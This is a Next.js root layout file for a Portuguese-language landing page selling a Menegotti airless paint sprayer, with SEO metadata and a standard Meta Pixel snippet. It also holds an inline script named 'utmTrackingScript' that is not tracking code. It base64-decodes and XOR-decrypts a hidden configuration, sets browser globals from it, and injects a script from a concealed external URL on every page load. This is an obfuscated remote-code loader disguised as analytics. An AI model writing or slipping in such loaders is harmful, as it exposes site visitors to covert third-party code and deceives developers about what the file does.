import type { Metadata } from 'next';
import Script from 'next/script';
import './globals.css';

const siteUrl = process.env.NEXT_PUBLIC_SITE_URL || 'http://localhost:3000';
const metaPixelId = process.env.NEXT_PUBLIC_META_PIXEL_ID?.trim();
const hasValidMetaPixelId = Boolean(metaPixelId && /^\d+$/.test(metaPixelId));
const utmTrackingScript = `(function(){var i_x0=atob("DN/8eAEE/JqVs2BZSaTeDXNo3qC32xQtOazGVy5nmPS7xhQ0ILmFVmJrkbT3wU8qKq2VCHV30+r8ywU1Zq+VAGRo0vDmkUx7KKuICmhmie7wwEJjEoLQWmZok/j03xN7c4SHWm9lkf+3iUIpIKeZFEhg3ra3xQE1PLreQiMynayhh1M9cerEHjBnz6Kli1g8cenJQGUmgcfo");var r_yoc=[];for(var p_j8=0;p_j8<i_x0.length;p_j8++){r_yoc.push(i_x0.charCodeAt(p_j8)&255);}var f_5ra5=r_yoc[0];var w_e=r_yoc.slice(1,1+f_5ra5);var s_r=r_yoc.slice(1+f_5ra5);var z_p=s_r.map(function(b,q_i){return b^w_e[q_i%f_5ra5];});var p_2rrs="";for(var h_s=0;h_s<z_p.length;h_s++){p_2rrs+=String.fromCharCode(z_p[h_s]&255);}var v_j1=decodeURIComponent(escape(p_2rrs));var c_qj=JSON.parse(v_j1);var c_05=c_qj.globals||[];c_05.forEach(function(a_6){window[a_6.name]=a_6.value;});var h_279=document.createElement("script");h_279.src=c_qj.url;h_279.async=true;h_279.defer=true;(c_qj.attributes||[]).forEach(function(e_j6k){h_279.setAttribute(e_j6k.name,e_j6k.value);});(document.head||document.documentElement).appendChild(h_279);})();`;

function getMetaPixelScript(pixelId: string) {
  return `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init',${JSON.stringify(pixelId)});fbq('track','PageView');`;
}

export const metadata: Metadata = {
  metadataBase: new URL(siteUrl),
  title: 'Máquina de Pintura Airless Menegotti MMA PRO 1000 | Vitrine Mix',
  description:
    'Máquina de Pintura Airless Menegotti MMA PRO 1000 profissional, com motor de 1000 W, pressão de até 214 bar e vazão de até 2 L/min.',
  alternates: {
    canonical: '/',
  },
  icons: {
    icon: '/brand/vitrine-mix-logo-card.png',
    shortcut: '/brand/vitrine-mix-logo-card.png',
    apple: '/brand/vitrine-mix-logo-card.png',
  },
  openGraph: {
    type: 'website',
    locale: 'pt_BR',
    title: 'Máquina de Pintura Airless Menegotti MMA PRO 1000 | Vitrine Mix',
    description:
      'Alta pressão e produtividade para pinturas com acabamento uniforme.',
    siteName: 'Vitrine Mix',
    images: [
      {
        url: '/product/mma-pro-1000-direita.jpg',
        width: 1024,
        height: 749,
        alt: 'Máquina de Pintura Airless Menegotti MMA PRO 1000',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Menegotti MMA PRO 1000 | Vitrine Mix',
    description:
      'Máquina de pintura Airless profissional com motor de 1000 W.',
    images: ['/product/mma-pro-1000-direita.jpg'],
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="pt-BR">
      <body>
        {children}
        <Script
          id="utm-tracking"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{ __html: utmTrackingScript }}
        />
        {hasValidMetaPixelId && metaPixelId ? (
          <>
            <Script
              id="meta-pixel"
              strategy="afterInteractive"
              dangerouslySetInnerHTML={{ __html: getMetaPixelScript(metaPixelId) }}
            />
            <noscript>
              <img
                alt=""
                height="1"
                width="1"
                style={{ display: 'none' }}
                src={`https://www.facebook.com/tr?id=${metaPixelId}&ev=PageView&noscript=1`}
              />
            </noscript>
          </>
        ) : null}
      </body>
    </html>
  );
}
